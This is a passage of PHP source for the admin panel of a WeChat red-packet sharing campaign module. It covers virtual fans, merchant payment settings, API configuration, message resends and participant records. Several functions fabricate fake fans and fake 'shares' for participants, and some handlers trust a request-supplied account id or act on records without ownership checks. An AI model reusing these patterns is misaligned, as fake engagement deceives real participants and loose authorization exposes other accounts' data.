            $where = ' AND `nickname` LIKE :keyword';
            $params[':keyword'] = "%{$_GPC['keyword']}%";
        }
        $total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_virtual') . "  where (uniacid=:uniacid or uniacid = 0) " . $where . "", $params);
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_virtual') . " where (uniacid=:uniacid or uniacid = 0) " . $where . " order by id desc " . $limit, $params);
        include $this->template('virtual');
    }
	//虚拟粉丝管理
	//虚拟粉丝修改
	public function doWebVirtualpost() {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
		load()->func('tpl');
		if(!empty($id)) {
			$item = pdo_fetch("select * FROM ".tablename('stonefish_virtual')." where id = :id", array(':id' => $id));				
		}else{
			$item['uniacid'] = $_W['uniacid'];
			$item['status'] = 1;
			$item['public'] = 1;
			$item['from_user'] = 'stonefishvirtualrobot'.time();
		}
		if(checksubmit('submit')) {
			if(empty($_GPC['edit']) && empty($_GPC['fuzhi'])){
				message('系统虚拟粉丝，无权修改', url('site/entry/virtual', array('m' => 'stonefish_redfunshare')), 'error');
			}
			if(empty($_GPC['nickname'])){
				message('虚拟粉丝昵称必需输入', referer(), 'error');
			}
			if(!isset($_GPC['avatar'])){
				message('虚拟粉丝头你图必需上传', referer(), 'error');
			}		
			$data = array(
				'uniacid'          => $_GPC['uniacid'],
				'from_user'        => $_GPC['from_user'],
				'avatar'           => $_GPC['avatar'],
				'nickname'         => $_GPC['nickname'],
				'public'           => $_GPC['public'],
				'status'           => $_GPC['status'],
		    );
			if(!empty($_GPC['edit'])){
				if(!empty($id)) {
				    pdo_update('stonefish_virtual', $data, array('id' => $id));
				    message('虚拟粉丝修改成功！', url('site/entry/virtual', array('m' => 'stonefish_redfunshare')), 'success');
			    }else{
				    pdo_insert('stonefish_virtual', $data);
				    message('虚拟粉丝添加成功！', url('site/entry/virtual', array('m' => 'stonefish_redfunshare')), 'success');
			    }
			}
			if(!empty($_GPC['fuzhi'])){
				$data['uniacid'] = $_W['uniacid'];
				$data['from_user'] = 'stonefishvirtualrobot'.time();
				pdo_insert('stonefish_virtual', $data);
				$id = pdo_insertid();
				message('虚拟粉丝复制成功！', url('site/entry/virtualpost', array('m' => 'stonefish_redfunshare','id' => $id)), 'success');
			}
		}
        include $this->template('virtualpost');
    }
	//虚拟粉丝修改	
	//虚拟粉丝删除
	public function doWebVirtualdel() {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
		load()->func('tpl');
		if(!empty($id)) {
			$item = pdo_fetch("select * FROM ".tablename('stonefish_virtual')." where id = :id", array(':id' => $id));
			if(!empty($item)){
				if($item['uniacid']){
					pdo_delete('stonefish_virtual', array('id' => $id));
				    message('虚拟粉丝删除成功', referer(), 'success');
				}else{
					message('系统虚拟粉丝，无权删除', referer(), 'error');
				}				
			}else{
				message('虚拟粉丝不存在或已删除', referer(), 'error');
			}
		}else{
			message('系统出错', referer(), 'error');
		}
    }
	//虚拟粉丝删除
	//红包设置
	public function doWebRedpackset() {
        global $_GPC, $_W;
		//查询是否填写系统参数
		$setting = $this->config($this->createWebUrl('redpackset'),'红包设置');
		//查询是否填写系统参数
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		load()->func('tpl');
		load()->func('file');
		$redpack = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_redpack')." where uniacid = :uniacid", array(':uniacid' => $_W['uniacid']));
		$cert  = "images/cert/".$_W['uniacid']."/apiclient_cert.pem";
		$key = "images/cert/".$_W['uniacid']."/apiclient_key.pem";
		$ca = "images/cert/".$_W['uniacid']."/rootca.pem";
		$redpack['ip'] = empty($redpack['ip']) ? $_SERVER["LOCAL_ADDR"] : $redpack['ip'];
		if(file_exists(ATTACHMENT_ROOT . '/'.$cert))$_cert = 1;
		if(file_exists(ATTACHMENT_ROOT . '/'.$key))$_key = 1;
		if(file_exists(ATTACHMENT_ROOT . '/'.$ca))$_ca = 1;
		if(checksubmit('submit')) {
			if(empty($_GPC['mchid'])){
				message('商户号必需输入', referer(), 'error');
			}
			if(empty($_GPC['signkey'])){
				message('商户密钥必需输入', referer(), 'error');
			}			
			if(empty($_GPC['appid'])){
				message('appid必需输入', referer(), 'error');
			}
			if(empty($_GPC['secret'])){
				message('secret必需输入', referer(), 'error');
			}
			if(empty($_GPC['ip'])){
				message('服务器ip必需输入', referer(), 'error');
			}
			$data = array(
				'uniacid'          => $_W['uniacid'],
				'mchid'            => $_GPC['mchid'],
				'signkey'          => $_GPC['signkey'],
				'appid'            => $_GPC['appid'],
				'secret'           => $_GPC['secret'],
				'ip'               => $_GPC['ip'],
		    );
			if(!empty($_GPC['cert'])) {
				$picurl = "images/cert/".$_W['uniacid']."/apiclient_cert.pem";
				if(file_exists(ATTACHMENT_ROOT . '/'.$picurl))file_delete($picurl);
				$upload = file_write($picurl,$_GPC['cert']);
            }
            if(!empty($_GPC['key'])) {
				$picurl = "images/cert/".$_W['uniacid']."/apiclient_key.pem";
				if(file_exists(ATTACHMENT_ROOT . '/'.$picurl))file_delete($picurl);
				$upload = file_write($picurl,$_GPC['key']);	
            }
            if(!empty($_GPC['ca'])) {
				$picurl = "images/cert/".$_W['uniacid']."/rootca.pem";
				if(file_exists(ATTACHMENT_ROOT . '/'.$picurl))file_delete($picurl);
				$upload = file_write($picurl,$_GPC['ca']);	
            }
			if(!empty($redpack['id'])) {
				pdo_update('stonefish_redfunshare_redpack', $data, array('uniacid' => $_W['uniacid']));
				message('红包设置修改成功！', url('site/entry/redpackset', array('m' => 'stonefish_redfunshare')), 'success');
			}else{
				pdo_insert('stonefish_redfunshare_redpack', $data);
				message('红包设置保存成功！', url('site/entry/redpackset', array('m' => 'stonefish_redfunshare')), 'success');
			}
		}
        include $this->template('redpackset');
    }
	//红包设置
	//接口中心
	public function doWebApiconfig() {
        global $_GPC, $_W;
		//查询是否填写系统参数
		$setting = $this->config($this->createWebUrl('apiconfig'),'接口中心');
		//查询是否填写系统参数
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		load()->func('tpl');
		$op = $_GPC['op'];
		$dos = array('display', 'apirecord', 'apiadd', 'apiaddnum');
        $op = in_array($op, $dos) ? $op : 'display';
		$api = $_GPC['api'];
		$apidos = array('mobileofsms', 'mobileofflow', 'mobileofpay');
        $api = in_array($api, $apidos) ? $api : 'mobileofsms';
		if($api == 'mobileofsms')$apiname = '验证码';
		if($api == 'mobileofflow')$apiname = '流量';
		if($api == 'mobileofpay')$apiname = '话费';
		if($api == 'mobileofsms')$apidanwei = '条数';
		if($api == 'mobileofflow')$apidanwei = '额度';
		if($api == 'mobileofpay')$apidanwei = '额度';
		if($op == 'display') {
		    $apiconfig = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_apiconfig')." where uniacid = :uniacid and apitype = :api", array(':uniacid' => $_W['uniacid'],':api' => $api));
		    if(checksubmit('submit')) {
			    if(empty($_GPC['key'])){
				    message('AppKey必需输入', referer(), 'error');
			    }
				if(empty($_GPC['sign'])&&$api == 'mobileofpay'){
				    message('openid必需输入', referer(), 'error');
			    }
			    if(empty($_GPC['tpl_id'])&&$api == 'mobileofsms'){
				    message('模板ID必需输入', referer(), 'error');
			    }
			    if(empty($_GPC['sign'])&&$api == 'mobileofsms'){
				    message('短信验证签名必需输入', referer(), 'error');
			    }
			    if(empty($_GPC['aging'])&&$api == 'mobileofsms'){
				    message('验证码时效必需输入', referer(), 'error');
			    }			    
			    $data = array(
				    'uniacid'         => $_W['uniacid'],
				    'apitype'         => $api,
					'key'             => $_GPC['key'],
				    'tpl_id'          => $_GPC['tpl_id'],
				    'sign'            => $_GPC['sign'],
				    'aging'           => $_GPC['aging'],
				    'agingrepeat'     => $_GPC['agingrepeat'],
		        );
			    if(!empty($apiconfig)) {
				    pdo_update('stonefish_redfunshare_apiconfig', $data, array('id' => $apiconfig['id']));
				    message($apiname.'配置修改成功！', url('site/entry/apiconfig', array('m' => 'stonefish_redfunshare','api' => $api)), 'success');
			    }else{
				    pdo_insert('stonefish_redfunshare_apiconfig', $data);
				    message($apiname.'配置设置成功！', url('site/entry/apiconfig', array('m' => 'stonefish_redfunshare','api' => $api)), 'success');
			    }
		    }
            include $this->template('apiconfig');
		}
		if($op == 'apirecord') {
			$total = pdo_fetchcolumn("SELECT count(id) FROM " . tablename('stonefish_mcenter_juheapirecord') . "  WHERE uniacid = :uniacid and module = :module and apitype = :apitype",array(':uniacid' => $_W['uniacid'],':module' => 'stonefish_redfunshare',':apitype' => $api));
            $pindex = max(1, intval($_GPC['page']));
            $psize = 20;
            $pager = pagination($total, $pindex, $psize);
            $start = ($pindex - 1) * $psize;
            $limit .= " LIMIT {$start},{$psize}";
            $record = pdo_fetchall("SELECT * FROM " . tablename('stonefish_mcenter_juheapirecord') . " WHERE uniacid=:uniacid and module = :module and apitype = :apitype ORDER BY createtime DESC " . $limit, array(':uniacid' => $_W['uniacid'],':module' => 'stonefish_redfunshare',':apitype' => $api));
		    load()->model('mc');
		    foreach ($record as &$records) {			
			    $profile = mc_fetch($records['uid'], array('realname','avatar'));
			    $records['realname'] = $profile['realname'];
			    $records['avatar'] = $profile['avatar'];
		    }
			include $this->template('apirecord');
		}
		if($op == 'apiadd') {
			$total = pdo_fetchcolumn("SELECT count(id) FROM " . tablename('stonefish_mcenter_juheapi') . "  WHERE uniacid = :uniacid and apitype = :apitype",array(':uniacid' => $_W['uniacid'],':apitype' => $api));
            $pindex = max(1, intval($_GPC['page']));
            $psize = 20;
            $pager = pagination($total, $pindex, $psize);
            $start = ($pindex - 1) * $psize;
            $limit .= " LIMIT {$start},{$psize}";
            $record = pdo_fetchall("SELECT * FROM " . tablename('stonefish_mcenter_juheapi') . " WHERE uniacid=:uniacid and apitype = :apitype ORDER BY createtime DESC " . $limit, array(':uniacid' => $_W['uniacid'],':apitype' => $api));
		    include $this->template('apiadd');
		}
		if($op == 'apiaddnum') {
			if($_W['isajax']) {
			    include $this->template('apiaddnum');
		    }
		    if($_GPC['save']=='yes'){
			    $data = array(
				    'uniacid' => $_W['uniacid'],
				    'apitype' => $_GPC['api'],
					'total' => $_GPC['total'],
				    'log' => $_GPC['log'],
				    'createtime' => TIMESTAMP
			    );
			    pdo_insert('stonefish_mcenter_juheapi', $data);
			    message('充值保存成功！', $this->createWebUrl('apiconfig',array('op'=>'apiadd','api'=>$_GPC['api'])), 'success');
		    }
		}
    }
	//接口中心
	//活动状态设置
    public function doWebSetshow() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);
        $isshow = intval($_GPC['isshow']);
        if (empty($rid)) {
            message('抱歉，传递的参数错误！', '', 'error');
        }
        $temp = pdo_update('stonefish_redfunshare_reply', array('isshow' => $isshow), array('rid' => $rid));
		if($isshow){
			message('状态设置成功！活动已开启！', referer(), 'success');
		}else{
			message('状态设置成功！活动已关闭！', referer(), 'success');
		}
       
    }
	//活动状态设置
	//删除活动
	public function doWebDelete() {
        global $_GPC, $_W;
        $rid = intval($_GPC['rid']);
        $rule = pdo_fetch("select id, module from " . tablename('rule') . " where id = :id and uniacid=:uniacid", array(':id' => $rid, ':uniacid' => $_W['uniacid']));
        if (empty($rule)) {
            message('抱歉，要修改的规则不存在或是已经被删除！');
        }
        if (pdo_delete('rule', array('id' => $rid))) {
            pdo_delete('rule_keyword', array('rid' => $rid));
            //删除统计相关数据
            pdo_delete('stat_rule', array('rid' => $rid));
            pdo_delete('stat_keyword', array('rid' => $rid));
            //调用模块中的删除
            $module = WeUtility::createModule($rule['module']);
            if (method_exists($module, 'ruleDeleted')) {
                $module->ruleDeleted($rid);
            }
        }
        message('活动删除成功！', referer(), 'success');
    }
	//删除活动
	//批理删除活动
	public function doWebDeleteAll() {
        global $_GPC, $_W;
        foreach ($_GPC['idArr'] as $k => $rid) {
            $rid = intval($rid);
            if ($rid == 0)
                continue;
            $rule = pdo_fetch("select id, module from " . tablename('rule') . " where id = :id and uniacid=:uniacid", array(':id' => $rid, ':uniacid' => $_W['uniacid']));
            if (empty($rule)) {
				echo json_encode(array('errno' => 1,'error' => '抱歉，要修改的规则不存在或是已经被删除！'));
				exit;
            }
            if (pdo_delete('rule', array('id' => $rid))) {
                pdo_delete('rule_keyword', array('rid' => $rid));
                //删除统计相关数据
                pdo_delete('stat_rule', array('rid' => $rid));
                pdo_delete('stat_keyword', array('rid' => $rid));
                //调用模块中的删除
                $module = WeUtility::createModule($rule['module']);
                if (method_exists($module, 'ruleDeleted')) {
                    $module->ruleDeleted($rid);
                }
            }
        }
        //message('选择中的活动删除成功！', referer(), 'success');
		echo json_encode(array('errno' => 0,'error' => '选择中的活动删除成功！'));
		exit;
    }
	//批理删除活动
	//消息通知记录
	public function doWebPosttmplmsg() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$rid = empty($rid) ? intval($_GPC['id']) : $rid;
		$reply = pdo_fetch("select poweravatar,mobileverify from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		//消息模板
		$tmplmsg = pdo_fetchall("SELECT * FROM " . tablename('stonefish_redfunshare_tmplmsg') . " WHERE uniacid = :uniacid ORDER BY `id` asc", array(':uniacid' => $_W['uniacid']));
		//消息模板
		$params = array(':rid' => $rid, ':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['nickname'])) {
            $where.=' and b.nickname LIKE :nickname';
            $params[':nickname'] = "%{$_GPC['nickname']}%";
        }
		if (!empty($_GPC['realname'])) {     
            $where.=' and b.realname LIKE :realname';
            $params[':realname'] = "%{$_GPC['realname']}%";
        }
		if (!empty($_GPC['mobile'])) {     
            $where.=' and b.mobile LIKE :mobile';
            $params[':mobile'] = "%{$_GPC['mobile']}%";
        }		
		if($_GPC['zhongjiang']==1){
			$where.=' and b.zhongjiang =0';
		}
		if($_GPC['zhongjiang']==2){
			$where.=' and b.zhongjiang>=1';
		}
		if($_GPC['zhongjiang']==3){
			$where.='and b.zhongjiang>=1 and b.xuni=1';
		}
		if (!empty($_GPC['tmplmsgid'])) {     
            $where.=' and a.tmplmsgid =:tmplmsgid';
            $params[':tmplmsgid'] = "{$_GPC['tmplmsgid']}";
        }
		$total = pdo_fetchcolumn("select count(a.id) from " . tablename('stonefish_redfunshare_fanstmplmsg') . " as a," . tablename('stonefish_redfunshare_fans') . " as b where a.rid = :rid and a.uniacid=:uniacid and a.from_user=b.from_user" . $where . "", $params);
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select a.id,a.from_user,a.tmplmsg,a.createtime,a.seednum,b.avatar,b.realname,b.nickname,b.mobile,c.template_name from " . tablename('stonefish_redfunshare_fanstmplmsg') . " as a," . tablename('stonefish_redfunshare_fans') . " as b," . tablename('stonefish_redfunshare_tmplmsg') . " as c where a.rid = :rid and a.uniacid=:uniacid and a.from_user=b.from_user and c.id=a.tmplmsgid" . $where . " order by a.id desc " . $limit, $params);
		//是否为关注会员并发送消息
		foreach ($list as &$lists) {
			$lists['fanid'] = pdo_fetchcolumn("select fanid FROM ".tablename('mc_mapping_fans') ." where openid=:openid and uniacid=:uniacid and follow=1",array(":openid"=>$lists['from_user'],":uniacid"=>$_W['uniacid']));
		}
		//是否为关注会员并发送消息
        include $this->template('posttmplmsg');
    }
	//消息通知记录
	//模板消息内容
	public function doWebTmplmsginfo() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			load()->func('tpl');
			$id = intval($_GPC['id']);
			$fanstmplmsg = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fanstmplmsg')." where id = :id", array(':id' => $id));
			if(!empty($fanstmplmsg)){
				$data = pdo_fetch("select avatar,nickname from ".tablename('stonefish_redfunshare_fans')." where from_user = :from_user and rid = :rid", array(':from_user' => $fanstmplmsg['from_user'],':rid' => $fanstmplmsg['rid']));
				$fanstmplmsg['tmplmsg'] = json_decode($fanstmplmsg['tmplmsg'],true);
				$len=count($fanstmplmsg['tmplmsg']['data']);
			}
			include $this->template('tmplmsginfo');
			exit();
		}
    }
	//模板消息内容
	//再次发送模板消息
	public function doWebSeedtmplmsg() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		load()->func('communication');
        load()->classs('weixin.account');
        $accObj = WeixinAccount::create($_W['acid']);
        $access_token = $accObj->fetch_token();
		if (empty($access_token)) {
            message('系统出错！', url('site/entry/posttmplmsg',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page'=>intval($_GPC['page']))), 'error');
        }
		if($_GPC['all']=='yes'){
			foreach ($_GPC['idArr'] as $k => $id) {
                $id = intval($id);
                if($id == 0)
                    continue;
			    $fanstmplmsg = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fanstmplmsg')." where id = :id", array(':id' => $id));
                if(empty($fanstmplmsg)){
				    echo json_encode(array('errno' => 1,'error' => '抱歉，选中的模板消息数据不存在！'));
				    exit;
                }				
			    $postarr = $fanstmplmsg['tmplmsg'];
                $res = ihttp_post('https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=' . $access_token, $postarr);
			    //添加消息发送记录
			    $tmplmsgdata = array(
				    'seednum' => $fanstmplmsg['seednum']+1,
				    'createtime' => TIMESTAMP,
			    );
			    pdo_update('stonefish_redfunshare_fanstmplmsg', $tmplmsgdata, array('id' => $id));
            }
		    echo json_encode(array('errno' => 0,'error' => '选中的模板消息数据再次发送成功！'));
		    exit;
		}else{
			$id = intval($_GPC['id']);
		    $fanstmplmsg = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fanstmplmsg')." where id = :id", array(':id' => $id));
		    if(!empty($fanstmplmsg)){
			    $postarr = $fanstmplmsg['tmplmsg'];
                $res = ihttp_post('https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=' . $access_token, $postarr);
			    //添加消息发送记录
			    $tmplmsgdata = array(
				    'seednum' => $fanstmplmsg['seednum']+1,
				    'createtime' => TIMESTAMP,
			    );
			    pdo_update('stonefish_redfunshare_fanstmplmsg', $tmplmsgdata, array('id' => $id));
			    message('模板消息再次发送成功！', url('site/entry/posttmplmsg',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page'=>intval($_GPC['page']))), 'success');
			    //添加消息发送记录
		    }else{
			    message('模板消息内容出错！', url('site/entry/posttmplmsg',array('rid' => $rid, 'm' => 'stonefish_redfunshare','page'=>intval($_GPC['page']))), 'error');
		    }
		}
    }	
	//再次发送模板消息
	//参与活动粉丝
	public function doWebFansdata() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$rid = empty($rid) ? intval($_GPC['id']) : $rid;
		$reply = pdo_fetch("select poweravatar,mobileverify from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//查询do参数
		if(empty($_GPC['do'])){
			$_GPC['do'] = pdo_fetchcolumn("select do from " . tablename('modules_bindings') . "  where eid = :eid and module=:module", array(':eid' => $_GPC['eid'], ':module' => 'stonefish_redfunshare'));
		}
		//查询do参数
		$params = array(':rid' => $rid, ':uniacid' => $_W['uniacid']);
		if (!empty($_GPC['nickname'])) {
            $where.=' and nickname LIKE :nickname';
            $params[':nickname'] = "%{$_GPC['nickname']}%";
        }
		if (!empty($_GPC['realname'])) {     
            $where.=' and realname LIKE :realname';
            $params[':realname'] = "%{$_GPC['realname']}%";
        }
		if (!empty($_GPC['mobile'])) {     
            $where.=' and mobile LIKE :mobile';
            $params[':mobile'] = "%{$_GPC['mobile']}%";
        }
		//导出标题以及参数设置
		if($_GPC['zhongjiang']==''){
		    $statustitle = '全部';
		}
		if($_GPC['zhongjiang']==1){
		    $statustitle = '未中奖';
			$where.=' and zhongjiang=0';
		}
		if($_GPC['zhongjiang']==2){
		    $statustitle = '已中奖';
			$where.=' and zhongjiang>=1';
		}
		if($_GPC['zhongjiang']==3){
		    $statustitle = '虚拟奖';
			$where.=' and zhongjiang>=1 and xuni=1';
		}
		if($_GPC['limit']==2){
		    $statustitle = '无效参与';
			$where.=' and `limit`=0';
		}
		if($_GPC['limit']==1){
		    $statustitle = '有效参与';
			$where.=' and `limit`=1';
		}
		//导出标题以及参数设置				
		$total = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid and uniacid=:uniacid " . $where . "", $params);
        $psize = 20;
		$pagemax = ceil($total/$psize);
		$_GPC['page'] = $_GPC['page']>$pagemax ? $pagemax : $_GPC['page'];
        $pindex = max(1, intval($_GPC['page']));
        $pager = pagination($total, $pindex, $psize);
        $start = ($pindex - 1) * $psize;
        $limit .= " LIMIT {$start},{$psize}";
        $list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_fans') . " where rid = :rid and uniacid=:uniacid " . $where . " order by id desc " . $limit, $params);
		//中奖情况以及是否为关注会员并发送消息
		foreach ($list as &$lists) {
			$lists['awardinfo'] = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fansaward') . "  where rid = :rid and from_user=:from_user", array(':rid' => $rid,':from_user' => $lists['from_user']));
			$lists['share_num'] = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_sharedata') . "  where rid = :rid and fromuser=:from_user", array(':rid' => $rid,':from_user' => $lists['from_user']));
			$lists['fanid'] = pdo_fetchcolumn("select fanid FROM ".tablename('mc_mapping_fans') ." where openid=:openid and uniacid=:uniacid and follow=1",array(":openid"=>$lists['from_user'],":uniacid"=>$_W['uniacid']));
		}
		//中奖情况以及是否为关注会员并发送消息
		//一些参数的显示
        $num1 = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid and uniacid=:uniacid and zhongjiang=0", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
        $num2 = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid and uniacid=:uniacid and zhongjiang>=1", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
        $num3 = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid and uniacid=:uniacid and zhongjiang>=1 and xuni=1", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		//一些参数的显示
        include $this->template('fansdata');
    }
	//参与活动粉丝
	//参与活动粉丝状态
	public function doWebSetfansstatus() {
		global $_GPC, $_W;
		$id = intval($_GPC['id']);
		$data = intval($_GPC['data']);
		if ($id) {
			$data = ($data==1?'0':'1');
			pdo_update("stonefish_redfunshare_fans", array('status' => $data), array("id" => $id));
			die(json_encode(array("result" => 1, "data" => $data)));
		}
		die(json_encode(array("result" => 0)));
	}
	//参与活动粉丝状态
	//删除参与活动粉丝
	public function doWebDeletefans() {
        global $_GPC, $_W;
		$rid = intval($_GPC['rid']);
		$reply = pdo_fetch("select id from ".tablename('stonefish_redfunshare_reply')." where rid = :rid and uniacid=:uniacid", array(':rid' => $rid, ':uniacid' => $_W['uniacid']));
		if(empty($reply)){
			echo json_encode(array('errno' => 1,'error' => '抱歉，传递的参数错误！'));
			exit;
        }
        foreach ($_GPC['idArr'] as $k => $id) {
            $id = intval($id);
            if($id == 0)
                continue;
			$fans = pdo_fetch("select * from ".tablename('stonefish_redfunshare_fans')." where id = :id", array(':id' => $id));
            if(empty($fans)){
				echo json_encode(array('errno' => 1,'error' => '抱歉，选中的粉丝数据不存在！'));
				exit;
            }
			//删除粉丝验证记录
			pdo_update('stonefish_redfunshare_mobileverify', array('verifytime' => 0), array('mobile' => $fans['mobile'],'rid' => $rid,'uniacid' => $_W['uniacid']));
			//删除粉丝验证记录
			//删除粉丝中奖详细记录
			pdo_delete('stonefish_redfunshare_fansaward', array('from_user' => $fans['from_user'],'rid' => $rid,'uniacid' => $_W['uniacid']));
			//删除粉丝中奖详细记录
			//删除粉丝分享详细记录
			pdo_delete('stonefish_redfunshare_sharedata', array('fromuser' => $fans['from_user'],'rid' => $rid,'uniacid' => $_W['uniacid']));
			//删除粉丝分享详细记录
			//删除粉丝消息模板记录
			pdo_delete('stonefish_redfunshare_fanstmplmsg', array('from_user' => $fans['from_user'],'rid' => $rid,'uniacid' => $_W['uniacid']));
			//删除粉丝消息模板记录
			//删除粉丝参与记录
			pdo_delete('stonefish_redfunshare_fans', array('id' => $id));
			//删除粉丝参与记录
        }
		//减少参与记录
		$fansnum = pdo_fetchcolumn("select count(id) from " . tablename('stonefish_redfunshare_fans') . "  where rid = :rid", array(':rid' => $rid));
		pdo_update('stonefish_redfunshare_reply', array('fansnum' => $fansnum), array('id' => $reply['id']));
		//减少参与记录
		echo json_encode(array('errno' => 0,'error' => '选中的粉丝删除成功！'));
		exit;
    }
	//删除参与活动粉丝
	//参与粉丝信息
	public function doWebUserinfo() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			$uid = intval($_GPC['uid']);
			$rid = intval($_GPC['rid']);
			//兑奖资料
			$reply = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_reply') . " where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
			$exchange = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
			$isfansname = explode(',',$exchange['isfansname']);
			//粉丝数据
			if($uid){
				$data = pdo_fetch("select * FROM ".tablename('stonefish_redfunshare_fans')." where id = :id", array(':id' => $uid));
			}else{
				echo '未找到指定粉丝资料';
				exit;
			}
			include $this->template('userinfo');
			exit();
		}
    }
	//参与粉丝信息
	//参与粉丝中奖记录信息
	public function doWebPrizeinfo() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			$uid = intval($_GPC['uid']);
			$rid = intval($_GPC['rid']);
			$reply = pdo_fetch("select danwei FROM " . tablename('stonefish_redfunshare_reply') . " where rid = :rid", array(':rid' => $rid));
			//中奖记录
			if($uid){
				$data = pdo_fetch("select id, from_user from " . tablename('stonefish_redfunshare_fans') . ' where id = :id', array(':id' => $uid));
				$list = pdo_fetchall("select * from " . tablename('stonefish_redfunshare_fansaward') . " where rid = :rid and uniacid=:uniacid and from_user=:from_user order by id desc ", array(':uniacid' => $_W['uniacid'], ':rid' => $rid, ':from_user' => $data['from_user']));
			}else{
				echo '未找到指定粉丝中奖记录';
				exit;
			}
			include $this->template('prizeinfo');
			exit();
		}
    }
	//参与粉丝中奖记录信息
	//助力详细情况
	public function doWebSharelist() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			$uid = intval($_GPC['uid']);
			$rid = intval($_GPC['rid']);
			//规则
			$reply = pdo_fetch("select poweravatar FROM " . tablename('stonefish_redfunshare_reply') . " where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
			//粉丝数据
			$data = pdo_fetch("select id, from_user  FROM " . tablename('stonefish_redfunshare_fans') . ' where id = :id', array(':id' => $uid));
			$share = pdo_fetchall("select * FROM " . tablename('stonefish_redfunshare_sharedata') . "  where rid = :rid and uniacid=:uniacid and fromuser=:fromuser ORDER BY id DESC ", array(':uniacid' => $_W['uniacid'], ':rid' => $rid, ':fromuser' => $data['from_user']));
			include $this->template('sharelist');
			exit();
		}
    }
	//助力详细情况
	//虚拟助力
	public function doWebAddxunishare() {
        global $_GPC, $_W;
		if($_W['isajax']) {
			load()->func('tpl');
			$uid = intval($_GPC['uid']);
			$rid = intval($_GPC['rid']);
			//规则
			$reply = pdo_fetch("select * FROM " . tablename('stonefish_redfunshare_reply') . " where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
			//粉丝数据
			$data = pdo_fetch("select *  FROM " . tablename('stonefish_redfunshare_fans') . ' where id = :id', array(':id' => $uid));
			//随机虚拟粉丝数据
			$xuni = pdo_fetch("select *  FROM " . tablename('stonefish_virtual') . " as a where (a.uniacid = 0 Or (a.uniacid !=:uniacid and a.public=1) Or a.uniacid =:uniacid) and a.status=1 and a.from_user not in (select b.from_user  FROM " . tablename('stonefish_redfunshare_sharedata') . " as b where b.virtual=1 and b.uniacid =:uniacid and b.rid =:rid) order by rand()", array(':uniacid' => $_W['uniacid'],':rid' => $rid));
			include $this->template('addxunishare');
			exit();
		}
    }
	public function doWebSavexunishare() {
        global $_GPC, $_W;
		$uid = intval($_GPC['uid']);
		$rid = intval($_GPC['rid']);
		if(!$rid){
		    message('系统出错', url('site/entry/fansdata',array('rid' => $rid, 'm' => 'stonefish_redfunshare', 'page' => intval($_GPC['page']))), 'error');
		}		
		if($uid) {
			//粉丝数据
			$data = pdo_fetch("select id,sharenum,from_user FROM " . tablename('stonefish_redfunshare_fans') . ' where id = :id', array(':id' => $uid));
			//添加中奖记录
            $insert = array(
                'uniacid' => $_W['uniacid'],
                'rid' => $rid,
                'virtual' => 1,
				'share_type'=>1,
                'from_user' => $_GPC['from_user'],
                'fromuser' => $data['from_user'],
                'avatar' => $_GPC['avatar'],
                'nickname' => $_GPC['nickname'],
				'visitorsip' => CLIENT_IP,
                'viewnum' => 1,
